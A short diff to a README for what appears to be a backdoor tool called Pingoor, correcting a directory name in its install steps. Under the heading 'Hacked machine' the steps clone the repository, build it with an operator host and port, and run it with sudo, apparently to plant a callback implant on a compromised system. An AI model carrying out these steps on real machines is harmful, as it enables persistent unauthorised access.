@@ -9,7 +9,7 @@
 ```
 # Hacked machine
 $ git clone https://github.com/MrEmpy/Pingoor.git
-$ cd Farllen
+$ cd Pingoor
 $ HOST=<YOURHOST> PORT=<YOURPORT> make
 $ sudo ./pingoor
 ```
